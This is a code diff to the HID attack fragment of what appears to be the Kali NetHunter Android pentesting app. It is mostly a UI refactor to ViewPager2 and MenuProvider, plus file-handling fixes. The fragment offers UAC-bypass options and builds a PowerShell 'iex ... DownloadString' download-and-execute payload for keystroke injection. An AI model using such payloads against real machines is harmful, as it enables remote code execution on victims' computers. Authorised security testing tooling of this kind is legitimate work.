@@ -8,7 +8,6 @@ import android.content.SharedPreferences.Editor;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Parcelable;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -22,6 +21,8 @@ import android.widget.EditText;
 import android.widget.Spinner;
 
 import com.google.android.material.dialog.MaterialAlertDialogBuilder;
+import com.google.android.material.tabs.TabLayout;
+import com.google.android.material.tabs.TabLayoutMediator;
 import com.offsec.nethunter.utils.NhPaths;
 import com.offsec.nethunter.utils.ShellExecuter;
 
@@ -36,13 +37,15 @@ import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.core.view.MenuHost;
+import androidx.core.view.MenuProvider;
 import androidx.fragment.app.Fragment;
-import androidx.fragment.app.FragmentManager;
-import androidx.fragment.app.FragmentPagerAdapter;
-import androidx.viewpager.widget.ViewPager;
+import androidx.lifecycle.Lifecycle;
+import androidx.viewpager2.adapter.FragmentStateAdapter;
+import androidx.viewpager2.widget.ViewPager2;
 
 public class HidFragment extends Fragment {
-    private ViewPager mViewPager;
+    private ViewPager2 mViewPager;
     private SharedPreferences sharedpreferences;
     private final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
     private final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portuguese", "Russian", "Spanish", "Swedish", "Canadian Multilingual", "Canadian", "Hungarian"};
@@ -80,77 +83,86 @@ public class HidFragment extends Fragment {
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
         View rootView = inflater.inflate(R.layout.hid, container, false);
-        HidFragment.TabsPagerAdapter tabsPagerAdapter = new TabsPagerAdapter(getChildFragmentManager());
-
+        TabsAdapter tabsPagerAdapter = new TabsAdapter(this);
         mViewPager = rootView.findViewById(R.id.pagerHid);
         mViewPager.setAdapter(tabsPagerAdapter);
-
         configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
 
-        mViewPager.addOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
-            @Override
-            public void onPageSelected(int position) {
-                activity.invalidateOptionsMenu();
+        // Hook menu invalidation to page changes
+        mViewPager.registerOnPageChangeCallback(new ViewPager2.OnPageChangeCallback() {
+            @Override public void onPageSelected(int position) {
+                requireActivity().invalidateOptionsMenu();
             }
         });
-        setHasOptionsMenu(true);
+
+        // Setup TabLayout + titles
+        TabLayout tabLayout = rootView.findViewById(R.id.tabLayoutHid);
+        new TabLayoutMediator(tabLayout, mViewPager, (tab, position) -> {
+            switch (position) {
+                case 0:
+                    tab.setText("PowerSploit");
+                    break;
+                case 1:
+                    tab.setText("Windows CMD");
+                    break;
+                default:
+                    tab.setText("Powershell HTTP Payload");
+            }
+        }).attach();
+
+        MenuHost menuHost = requireActivity();
+        menuHost.addMenuProvider(new MenuProvider() {
+            @Override
+            public void onCreateMenu(@NonNull Menu menu, @NonNull MenuInflater inflater) {
+                inflater.inflate(R.menu.hid, menu);
+            }
+            @Override
+            public void onPrepareMenu(@NonNull Menu menu) {
+                if (mViewPager == null) return;
+                int pageNum = mViewPager.getCurrentItem();
+                MenuItem sourceButton = menu.findItem(R.id.source_button);
+                boolean iswatch = requireActivity().getPackageManager().hasSystemFeature(PackageManager.FEATURE_WATCH);
+                if (sourceButton != null) {
+                    sourceButton.setVisible(pageNum == 0 && !iswatch);
+                }
+            }
+            @Override
+            public boolean onMenuItemSelected(@NonNull MenuItem item) {
+                int id = item.getItemId();
+                if (id == R.id.start_service) {
+                    if (isHIDenable) start(); else {
+                        if (new File("/config/usb_gadget/g1").exists())
+                            NhPaths.showMessage_long(context,"HID interfaces are not enabled! Please enable in USB Arsenal.");
+                        else if (new File("/dev/hidg0").exists()) {
+                            NhPaths.showMessage_long(context, "Fixing HID interface permissions..");
+                            exe.RunAsRoot(new String[]{"chmod 666 /dev/hidg*"});
+                        } else {
+                            NhPaths.showMessage_long(context,"HID interfaces are not patched or enabled, please check your kernel configuration.");
+                        }
+                    }
+                    return true;
+                } else if (id == R.id.stop_service) {
+                    reset();
+                    return true;
+                } else if (id == R.id.admin) {
+                    openDialog();
+                    return true;
+                } else if (id == R.id.chooseLanguage) {
+                    openLanguageDialog();
+                    return true;
+                } else if (id == R.id.source_button) {
+                    Intent i = new Intent(activity, EditSourceActivity.class);
+                    i.putExtra("path", configFilePath);
+                    startActivity(i);
+                    return true;
+                }
+                return false;
+            }
+        }, getViewLifecycleOwner(), Lifecycle.State.RESUMED);
+
         sharedpreferences = activity.getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
         check_HID_enable();
         return rootView;
-    }
-
-    @Override
-    public void onCreateOptionsMenu(@NonNull Menu menu, MenuInflater inflater) {
-        inflater.inflate(R.menu.hid, menu);
-    }
-
-    @Override
-    public void onPrepareOptionsMenu(Menu menu) {
-        int pageNum = mViewPager.getCurrentItem();
-        final MenuItem sourceButton = menu.findItem(R.id.source_button);
-        //WearOS optimisation
-        boolean iswatch = requireActivity().getPackageManager().hasSystemFeature(PackageManager.FEATURE_WATCH);
-        if (pageNum == 0) {
-            sourceButton.setVisible(!iswatch);
-        } else {
-            sourceButton.setVisible(false);
-        }
-        activity.invalidateOptionsMenu();
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        int id = item.getItemId();
-        if (id == R.id.start_service) {
-            if (isHIDenable) {
-                start();
-            } else {
-                if (new File("/config/usb_gadget/g1").exists())
-                    NhPaths.showMessage_long(context,"HID interfaces are not enabled! Please enable in USB Arsenal.");
-                else if (new File("/dev/hidg0").exists()) {
-                    NhPaths.showMessage_long(context, "Fixing HID interface permissions..");
-                    exe.RunAsRoot(new String[]{"chmod 666 /dev/hidg*"});
-                }
-                else NhPaths.showMessage_long(context,"HID interfaces are not patched or enabled, please check your kernel configuration.");
-            }
-            return true;
-        } else if (id == R.id.stop_service) {
-            reset();
-            return true;
-        } else if (id == R.id.admin) {
-            openDialog();
-            return true;
-        } else if (id == R.id.chooseLanguage) {
-            openLanguageDialog();
-            return true;
-        } else if (id == R.id.source_button) {
-            Intent i = new Intent(activity, EditSourceActivity.class);
-            i.putExtra("path", configFilePath);
-            startActivity(i);
-            return true;
-        } else {
-            return super.onOptionsItemSelected(item);
-        }
     }
 
     private void start() {
@@ -292,15 +304,15 @@ public class HidFragment extends Fragment {
         builder.show();
     }
 
-    public static class TabsPagerAdapter extends FragmentPagerAdapter {
-        public TabsPagerAdapter(FragmentManager fm) {
-            super(fm);
+    public static class TabsAdapter extends FragmentStateAdapter {
+        public TabsAdapter(@NonNull Fragment fragment) {
+            super(fragment);
         }
 
         @NonNull
         @Override
-        public Fragment getItem(int i) {
-            switch (i) {
+        public Fragment createFragment(int position) {
+            switch (position) {
                 case 0:
                     return new PowerSploitFragment();
                 case 1:
@@ -311,25 +323,8 @@ public class HidFragment extends Fragment {
         }
 
         @Override
-        public Parcelable saveState() {
-            return null;
-        }
-
-        @Override
-        public int getCount() {
+        public int getItemCount() {
             return 3;
-        }
-
-        @Override
-        public CharSequence getPageTitle(int position) {
-            switch (position) {
-                case 1:
-                    return "Windows CMD";
-                case 0:
-                    return "PowerSploit";
-                default:
-                    return "Powershell HTTP Payload";
-            }
         }
     }
 
@@ -373,7 +368,9 @@ public class HidFragment extends Fragment {
                 String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
                 boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                if (!isSaved) {
+                if (isSaved) {
+                    NhPaths.showMessage(context, "Source updated");
+                } else {
                     NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
                 }
             } else {
@@ -454,7 +451,8 @@ public class HidFragment extends Fragment {
             context = getContext();
             activity = getActivity();
             configFilePath = NhPaths.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
-            loadFilePath = NhPaths.APP_SD_FILES_PATH + "/scripts/hid/";
+            // Use relative path here; join with base where needed
+            loadFilePath = "scripts/hid";
         }
 
         @Override
@@ -472,8 +470,6 @@ public class HidFragment extends Fragment {
             return rootView;
         }
 
-        private static final int PICKFILE_RESULT_CODE = 1;
-
         public void onClick(View v) {
             int id = v.getId();
             if (id == R.id.windowsCmdUpdate) {
@@ -489,18 +485,22 @@ public class HidFragment extends Fragment {
             } else if (id == R.id.windowsCmdLoad) {
                 try {
                     File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
-                    if (!scriptsDir.exists()) scriptsDir.mkdirs();
+                    if (!scriptsDir.exists() && !scriptsDir.mkdirs()) {
+                        NhPaths.showMessage(context, "Failed to create directory: " + scriptsDir.getAbsolutePath());
+                    }
                 } catch (Exception e) {
                     NhPaths.showMessage(context, e.getMessage());
                 }
                 Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
-                Uri selectedUri = Uri.parse(NhPaths.APP_SD_FILES_PATH + loadFilePath);
+                Uri selectedUri = Uri.fromFile(new File(NhPaths.APP_SD_FILES_PATH, loadFilePath));
                 intent.setDataAndType(selectedUri, "file/*");
                 this.filePickerLauncher.launch(intent);
             } else if (id == R.id.windowsCmdSave) {
                 try {
                     File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
-                    if (!scriptsDir.exists()) scriptsDir.mkdirs();
+                    if (!scriptsDir.exists() && !scriptsDir.mkdirs()) {
+                        NhPaths.showMessage(context, "Failed to create directory: " + scriptsDir.getAbsolutePath());
+                    }
                 } catch (Exception e) {
                     NhPaths.showMessage(context, e.getMessage());
                 }
@@ -528,8 +528,9 @@ public class HidFragment extends Fragment {
             alert.setPositiveButton("Ok", (dialog, whichButton) -> {
                 String value = input.getText().toString();
                 if (!value.isEmpty()) {
-                    //FIXME Save file (ask name)
-                    File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
+                    // Save under APP_SD_FILES_PATH/scripts/hid
+                    File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
+                    File scriptFile = new File(scriptsDir, value + ".conf");
                     if (!scriptFile.exists()) {
                         try {
                             if (getView() == null) {
@@ -537,7 +538,10 @@ public class HidFragment extends Fragment {
                             }
                             EditText source1 = getView().findViewById(R.id.windowsCmdSource);
                             String text1 = source1.getText().toString();
-                            scriptFile.createNewFile();
+                            if (!scriptFile.createNewFile()) {
+                                NhPaths.showMessage(context, "Could not create file: " + scriptFile.getAbsolutePath());
+                                return;
+                            }
                             FileOutputStream fOut = new FileOutputStream(scriptFile);
                             OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                             myOutWriter.append(text1);
@@ -556,29 +560,16 @@ public class HidFragment extends Fragment {
             });
             return alert;
         }
-
-        @Override
-        public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            if (requestCode == PICKFILE_RESULT_CODE && (resultCode == Activity.RESULT_OK && getView() != null)) {
-                    String FilePath = Objects.requireNonNull(data.getData()).getPath();
-                    EditText source = getView().findViewById(R.id.windowsCmdSource);
-                    exe.ReadFile_ASYNC(FilePath, source);
-                    NhPaths.showMessage(context, "Script loaded");
-
-            }
-        }
     }
 
     public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
         private Context context;
-        private String configFilePath;
         private String configFileUrlPath;
 
         @Override
         public void onCreate(@Nullable Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
             context = getContext();
-            configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-payload";
             configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-url";
         }
 
@@ -616,13 +607,9 @@ public class HidFragment extends Fragment {
 
             new Thread(() -> {
                 final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
-                final String text = exe.ReadFile_SYNC(configFilePath);
                 String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                 Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                 final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
-
-                String[] lines = text.split("\n");
-                final String line = lines[lines.length - 1];
 
                 payloadUrl.post(() -> {
                     if (matcherPayloadUrl.find()) {
@@ -648,3 +635,4 @@ public class HidFragment extends Fragment {
         }).start();
     }
 }
+
